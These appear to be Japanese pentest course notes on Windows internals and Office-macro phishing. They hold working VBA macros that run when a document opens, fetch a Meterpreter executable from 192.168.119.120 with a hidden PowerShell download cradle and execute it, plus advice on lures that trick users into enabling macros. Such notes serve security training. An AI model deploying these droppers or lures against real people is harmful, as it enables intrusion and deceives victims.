# Windowsの概念
Windowsでは64bit版で32bitアプリケーションを動かすためにWindows On Windows 64bit(WOW64)と言う概念を導入している。これにより32bit版のアプリケーションをほとんど効率を落とさずに実行できるようにした。

WOW64は4つの64bitライブラリ、Ntdll.dll、Wow64.dll、Wow64Win.dll、Wow64Cpu.dllを利用して32ビットコードの実行をエミュレートしてアプリケーションとカーネル間の変換を実行する。64bit版のWindowsではネイティブプログラムやDLLはC:\Windows\System32に32bit版はC:\Windows\SysWOW64に格納されている。

## Win32API
Windowsオペレーティングシステムとその各種アプリはアセンブリからC#までのさまざまなプログラミング言語で書かれているが、その多くはWindowsが提供する組み込みのアプリケーションプログラミングインタフェース（API）を利用している。  
これらのインタフェースはWind32APIとして知られ、開発者にあらかじめ組み込まれた機能を提供している。  
API自体はC言語から呼び出すように設計されており、C言語スタイルのデータ型で文書化されているが、他の複数のプログラミング言語でも使用することが可能である。
例として、GetUserNameと呼ばれるAPIにはGetUserNameAとGetUserNameWがある。最後のAとWはそれぞれASCIIのA、Unicodeを意味するWide charの接尾辞を表している。

## Windows Registry
多くのプログラミング言語ではローカル変数とグローバル変数という概念があり、ローカル変数は範囲が限定されグローバル変数はコード内のどこでも使用可能である。オペレーシングシステムもこれと同じようにグローバル変数を必要とする。Windowsではレジストリを使ってこれらの変数の多くを保存している。  
レジストリは膨大な数のキーと関連する値から構成される事実上のデータベースである。ルートには、レジストリキーを論理的に分割したレジストリはイブが複数格納されている。  
例として、現在のユーザーに関する情報はHKEY_CURRENT_USER(HKCU)ハイブに、オペレーシングシステム自体に関する情報はHKEY_LOCAL_MACHINE(HKLM)ハイブに格納されている。
レジストリはWin32APIによるプログラム的な操作とレジストリエディタ(regedit)のようなGUIによる操作の両方が可能である。
レジストリはオペレーティングシステムとさまざまなアプリケーションによって広範囲に使用されている。ペンテスターとして私たちはレジストリからさまざまな偵察情報を得たり攻撃を改善したり回避を実行するためにレジストリを修正したりすることができる。

# Officeによるクライアントサイドのコード実行
システムに不正なリモートアクセスを行うには通常2つの方法がある。1つ目はインターネットに公開されている脆弱なアプリケーションやサービスを悪用する方法だ。この場合、被害者との対話は必要ないがターゲットが脆弱なソフトウェアを実行している必要があり、それを悪用してターゲットにする必要があります。
リモートアクセスを得るための2つ目の方法は、ユーザーを騙して悪意のあるコードを実行させることです。この手法では、通常、被害者がブラウザでファイルまたは HTML ウェブページを操作する必要があります。  
この種の攻撃は、フィッシングとして知られるソーシャルエンジニアリングのカテゴリに属します。ソフトウェアの脆弱性は発見されてパッチが適用されるかもしれませんが、ユーザーの行動を修正することははるかに困難であるため、これは特に魅力的な攻撃ベクトルで、このモジュールで主に取り上げます。  
この種の攻撃をより効果的にするために、エンドユーザーが一般的に使用し、信頼しているソフトウェアの機能を悪用することを試みます。特に、このモジュールの目標は、Microsoft Office 製品を悪用してコードを実行させることです。これは、現実の攻撃や侵入テストの両方でよく見られる攻撃ベクトルです。
このモジュールでは、Microsoft Office Suite に対する様々なクライアントサイド攻撃を紹介します。最終的な目標は、ターゲット上でコードを実行することですが、一般的な攻撃シナリオについても説明し、ペイロード、シェルコード、および一般的なコマンド＆コントロールインフラストラクチャについても議論します。

## ドロッパーになってください。
実際の攻撃シナリオについて説明し、これらの概念がどのようにペネトレーションテストに反映されるかを説明しましょう。
クライアントサイド攻撃を開始するために、攻撃者は、多くの場合、トロイの木馬（スクリプトまたは文書の形）を被害者に配信し、それを実行するように騙す。従来のトロイの木馬は、ペイロード全体を埋め込みますが、より複雑なDropperトロイの木馬は、第2段階をダウンロードするために攻撃マシンに接続するコールバック関数と段階的なペイロードに依存しています。
コードが配信されると、ハードディスクに書き込まれるか、メモリから直接実行されます。いずれにせよ、このコードの目的は、攻撃者に戻る通信チャネルを作成することです。被害者のワークステーション上で実行されるコードは、インプラント、エージェント、バックドア、または単にマルウェアなど、いくつかの（しばしば同義語の）名前で知られています。
このコードがクライアント上で実行されると、攻撃者に通信を返すために、「コマンド＆コントロール」またはC2インフラストラクチャに接続する必要があります。このコードには、攻撃者のホスト名、ドメイン名、または IPアドレスが含まれ、HTTPやHTTPS（ユーザーの活動をシミュレートする）、DNS（一般的なネットワーク活動をシミュレートする）など、利用可能なネットワークプロトコルが使用されます。  
高度な攻撃者は、現実世界ではC2インフラストラクチャを活用しますが、このモジュールでは、単にターゲットと直接通信することになります。  
Metasploit フレームワークはこのプロセスを簡素化します。

## Staged vs Non-staged Payloads
Metasploitは、さまざまな方法でフォーマットできるペイロードの印象的なライブラリを誇っています。このフレームワークには、ステージングされたペイロードとステージングされていないペイロードの両方が含まれています。  
例えば、windows/shell_reverse_tcpは、単純な非ステージ化されたリバースTCPシェルペイロードです。これは、攻撃者のマシンにリバースコマンドシェルを開くために必要なすべてのコードを含んでいます。ペイロード自体は、実際にはいくつかのアセンブリ命令であり、実行されると、攻撃者のC2に接続し、cmd.exeコマンドプロンプトを公開するいくつかのWindows APIが呼び出されます。  
windows/shell/reverse_tcpのようなステージドペイロードは、コールバックを実行する最小限のコードを含み、その後、残りのコードを取得し、ターゲットのメモリ内で実行されます。このスリム化されたペイロードは、ステージングされていないペイロードほどメモリを消費しないため、アンチウイルスプログラムを回避することができます。  
これらのペイロードの名前に使用されているデリミタの違いに注意してください。非ステージ化ペイロードは _ を、ステージ化ペイロードは / をそれぞれ使用します。また、ペイロードの説明文には、ステージングか非ステージングかが記載されています。

## HTML Smuggling
攻撃者はしばしば、より目立たない配信方法を使用します。例えば、攻撃者は、電子メールにリンクを埋め込むことがあります。被害者がメールを読んでウェブページにアクセスすると、JavaScriptコードがHTML Smugglingを使用して、ドロッパーファイルを自動的に保存します。  
この技術は、HTMLのアンカータグのダウンロード属性52を利用しており、ユーザーが指定されたハイパーリンクをクリックすると、自動的にファイルをダウンロードするよう、ブラウザに指示します。  

## Microsoft Officeを利用したフィッシング
これまでの攻撃では、ファイルをダウンロードするか、悪意のあるサイトにアクセスするか、被害者と直接やり取りする必要がありました。これらの攻撃は、自動的に悪意のあるファイルをダウンロードさせる機能など、クライアントサイドの攻撃で機能する一般的な概念を示しています。  
このセクションでは、一般的に利用されているもう1つのクライアントサイド攻撃のベクターに注目します。Microsoft Officeアプリケーションです。  
Microsoft Officeは、多くの組織や企業で採用されている、非常に人気の高いソフトウェアスイートです。このソフトウェアには、継続的に更新され、オンラインストレージとして使用されるOffice365と、Office 2016のような様々なスタンドアロンバージョンの2種類があります。
その人気のため、Officeアプリケーションは、被害者が信頼する傾向があるため、フィッシングの格好のターゲットになっています。実際、Ciscoが2018年に発表した年次サイバーセキュリティレポートでは、Officeが全メールフィッシング攻撃の38%の標的になっていると報告されています。
ここでは、VBA（Visual Basic for Applications）組み込みプログラミング言語を活用した、この一般的な攻撃のベクトルを探ってみましょう。

## VBA入門
このモジュールでは、VBA の基本について、Microsoft Office に組み込まれたセキュリティ機構と合わせて説明します。  
まず、いくつかの条件文とメッセージボックスを含む最初のマクロを作成することから始めます。そして、Windows Script Hostの助けを借りて、MS Wordからコマンドプロンプトを実行することに挑戦します。  

被害者にカスタムマクロを実行させるためにDocument_Open()やAutoOpen()などの既存のメソッドを活用する必要がある。

VBAのさまざまなOfficeアプリケーションの利用には、いくつかの違いがあります。たとえば、Excelでは、Document_Open()はWorkbook_Open()と呼ばれています。

VBAを使用してcmd.exeのような外部アプリケーションを起動する方法を説明する。最も簡単な方法としてはVBAのShell関数を利用するもので2つの引数を取ります。1つ目は、起動するアプリケーションのパスと名前、そして任意の引数です。もう1つはWindowStyleで、これはプログラムのウィンドウスタイルを設定するものです。攻撃者としては、vbHideの値またはその数値（0）が、起動したプログラムのウィンドウを隠すことになるので、最も興味深いものです。  
以下の例では、被害者がマクロを有効にするとすぐに、隠されたウィンドウでコマンドプロンプトを起動することになります。

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

マクロを保存してWord文書を再び開くと、この文書ですでにマクロを有効にしているため、セキュリティ警告を出さずにマクロが実行されます。文書名を変更すると、セキュリティの警告が再び表示されます。  
コマンドプロンプトは隠しウィンドウとして開いたため、表示されませんが、実行されていることを確認できます。SysInternalsのProcess Explorerを使用すると、実行中のプロセスの情報、どのハンドルやDLLを開いたりロードしたりしたかを一覧表示できます。この例では、WINWORD.EXEの子プロセスとしてcmd.exeがリストアップされます。


また、Windows Script Host（WSH）を使用してシェルを起動することもできます。これを行うには、CreateObjectメソッドを呼び出してWSHシェルを作成し、そこから Runメソッドを呼び出します。これは複雑に聞こえるかもしれませんが、下記に示されるように簡単です。

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

## PowerShellに助けてもらう
これまで、Microsoft Officeに焦点を当て、VBAマクロの非常に基本的な仕組みについて説明してきました。次に、非常に強力で柔軟なPowerShell環境を、WordやExcelの文書を使ったフィッシング攻撃と一緒に使う方法について説明します。  
前項で説明したように、VBAは型を利用したコンパイル型の言語です。一方、PowerShellは.NETフレームワークを介してオンザフライでコンパイル・実行されるため、一般に型を使用せず、より柔軟性があります。  
PowerShellで変数を宣言するには、ドル記号（$）の文字を使うだけである。分岐文やループなどのPowerShellの制御ロジックは、他の多くのスクリプト言語と同様の構文に従います。構文上の最大の違いは、比較にあります。PowerShell は、典型的な == や != 構文を使用せず、代わりに -eq、-ne、および類似の構文を使用します。
PowerShellは、.NETフレームワークにアクセスできるので、外部のWebサーバからコンテンツ（セカンドステージのペイロードなど）をダウンロードするためのダウンロードクレードルなどの特殊な技術を簡単に実装することができます。最も一般的に使用されるバリアントは、Net.WebClientクラスです。

このクラスからオブジェクトをインスタンス化することで、DownloadFileメソッドを呼び出し、Webサーバーから任意のファイルを被害者にダウンロードすることができます。
次の例では、DownloadFileメソッドを呼び出す方法を説明します。まず、完全なスクリプトを作成し、それを1行のスクリプトにまとめます。  
DownloadFileは、ダウンロードされるファイルのURLと出力ファイル名の2つの引数を取ります。下記に示すように、ダウンロード手順全体は、わずか4行のPowerShellで記述することができます。  

まず、ダウンロードするファイルの変数を作成し、次にローカルファイルの名前の変数を作成しています。次に、Net.WebClient クラスをインスタンス化して、ダウンロードクレードルを作成し、そこから DownloadFile メソッドを呼び出してファイルをダウンロードします。この場合、先ほど作成したステージングされたMeterpreter実行ファイルと同じものを使用しました。  

```
$url = "http://192.168.119.120/msfstaged.exe"
$out = "msfstaged.exe"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)
```

あるいは、この4行を1行に圧縮することも可能です。
```
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')
```

概要として、PowerShellの文字列をVBAで動作するように変換して、ダウンロードクレードルをセットアップします。そして、システムにファイルをダウンロードする時間を与え、最後にファイルを実行します。  
VBAのコードを書き始めましょう。まず、文字列変数を宣言し、その文字列にPowerShellのダウンロードクレードルのコードを入力します。次に、Shellメソッドを使用して、ワンライナーを引数としてPowerShellを起動します。そして、Shellメソッドに、出力をユーザーから隠した状態でコードを実行するように指示します。
下記に示すコードセグメントは、被害者のマシンにファイルをダウンロードします。

```
Dim str As String
str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
Shell str, vbHide
```

VBAを通じてMeterpreterの実行ファイルを実行するには、フルパスを指定する必要があります。幸いなことに、ダウンロードしたコンテンツはWordドキュメントのカレントフォルダーに収まるので、下記に示すようにActiveDocument.Pathプロパティでパス名を取得することができます。

```
Dim exePath As String
exePath = ActiveDocument.Path + "\msfstaged.exe"
```

Meterpreterの実行ファイルをWebサーバーからダウンロードしており、ダウンロード時間は変動する可能性があるため、時間遅延を導入する必要があります。残念ながら、Microsoft WordにはExcelのようなwaitやsleepのVBA関数がないので、DoループとNowおよびDateAdd関数を使ってカスタムWaitメソッドを実装することにします。
これにより、Waitパラメータ（秒単位）を渡して、実行を一時停止させることができます。WaitプロシージャがMicrosoft Wordをブロックしないように、各反復処理でDoEventsを呼び出し、他のアクションを処理できるようにします。
まず、Now関数で現在の日付と時刻を取得し、変数tに保存します。次に、Doループを使用して、Loop Untilステートメントで宣言された比較を通じて動作させます。

```
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```
このコードは、比較が真になるまでループし続けます。これは、（Nowが返す）現在時刻がDateAdd関数が返す時刻より大きい場合に起こります。この関数は、時間の間隔を表す文字列式（"s"）、待機する秒数（n）、現在の時刻（t）の3つの引数を取ります。

簡単に言うと、ループを開始した時刻に「n」秒を加算し、その結果を現在時刻と比較するのである。n "秒が経過したら、ループは終了する。  
Waitメソッドの実装ができたので、あとはそれを呼び出してMeterpreterの実行ファイルを実行するだけです。そのためには、再びShell関数を使用して、作成したexePathを呼び出すことになります。  
完全なVBAマクロは、下記になります。

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path + "\msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

私たちが行ったことを復習しましょう。文書が開かれたとき（そしてマクロが有効になっているとき）、Meterpreterの実行ファイルをWebサーバーから取得するWord文書を作成しました。ファイルが完全にダウンロードされるように、わずかな時間遅延を追加しました。そして、そのファイルをユーザーから見えないように実行しました。この結果、Meterpreterの逆シェルができあがります。

## 体裁を整える
Word 文書とマクロを使用してクライアントにリモートアクセスする方法を理解したところで、次は被害者に実際に実行させるという、より人間的な要素に目を向けることにします。  
クライアントサイドのフィッシング攻撃を行う場合、被害者を欺く必要があります。場合によっては、何度も騙さなければならないこともある。例えば、ファイルを開く、オプションを有効にする（マクロを有効にするなど）、指定されたURLをブラウズするなどの操作をさせる必要がある場合があります。これらはすべて、私たちの悪意ある意図や行動を相手に気づかせることなく行わなければなりません。  
そのために、私たちは口実をつける必要があります。口実とは、基本的に偽の動機のことです。ソーシャル・エンジニアリング攻撃では、この偽の動機を使って、ターゲットに嘘をつき、普段しないようなことをするように仕向けることが基本です。

## フィッシングのプレテキスト
フィッシング攻撃は、被害者の行動を悪用し、好奇心や恐怖心を利用して、よりよい判断にもかかわらず、こちらのペイロードを起動させるように仕向ける。よく使われる手口としては、ターゲットとなる組織や特定の従業員によって、求人の申し込み、医療契約の更新、請求書、人事関連の依頼などがあります。  
Microsoft Officeを使ったフィッシング攻撃では、通常、攻撃者は文書を提示し、その文書が暗号化または保護されていると述べ、文書を適切に表示するには、ユーザが「編集を有効にする」「コンテンツを有効にする」必要があると示唆します。
このテクニックは、人気のある Quasat RATや Ursnif Trojanなどで使用されています。
ユーザが文書を開いた後は、その疑念を払拭するように努めなければならない。もし、この文書の構成が悪かったり、スパムのように見えたりすると、サポート担当者に警告を発し、我々の攻撃が危うくなる可能性がある。スペルミスや文法ミスを避け、内容が策略のスタイルに合っていることを確認するのがベストです。また、MicrosoftやRSAなどの暗号化規格など、ユーザーが知っていて信頼できそうな製品名やロゴを入れることで、文書が正規のものに見えるよう努力する必要があります。

## Wordメモリ内でのシェルコード実行
さて、説得力のある文書ができたので、ハードディスクに実行ファイルをダウンロードしないように、技術的なトレードクラフトを改良してみましょう。現在、私たちの悪意あるマクロは、ハードディスクにMeterpreterの実行ファイルをダウンロードし、それを実行しています。これには2つの欠点があります。
私たちの現在の技術では、実行ファイルをダウンロードする必要があり、ネットワーク監視ソフトウェアやホストベースのネットワーク監視によってフラグが立てられる可能性があります。次に、実行ファイルをハードディスクに保存するため、アンチウイルス・ソフトウェアに検出される可能性があります。
このセクションでは、今回の攻撃を修正し、ステージングされたMeterpreterペイロードをメモリ内で直接実行することにします。これは時間のかかる作業ですが、その過程で貴重なテクニックを学ぶことができます。
このコンセプトはVBAの限界を超えています。これは、ステージングされた Meterpreterペイロードが実際には純粋なアセンブリコードであり、メモリロケーションに置かれて実行されなければならないという事実が一因です。純粋なVBAを使用する代わりに、VBA内でWindowsオペレーティングシステムのネイティブAPIを活用することができます。

## VBAからWin32 APIを呼び出す
WindowsオペレーティングシステムAPI（またはWin32 API）は、ダイナミックリンクライブラリに配置され、アンマネージドコードとして実行されます。Declareキーワードを使用して、VBA でこれらの API にリンクし、関数の名前、存在するDLL、引数の型、および戻り値の型を提供することになります。Private Declareは、この関数がローカルコードでのみ使用されることを意味します。
この例では、GetUserName APIを使用します。宣言関数文を作成し、ユーザー名をMsgBoxでポップアップ表示します。Microsoft が MSDN で提供している公式ドキュメントには、リスト 36 に示すような関数のプロトタイプが含まれています。ドキュメントには、ユーザー名の最大サイズと、それが存在するDLL (Advapi32.dll) が記載されています。これを拡張して、必要な関数を宣言することができます。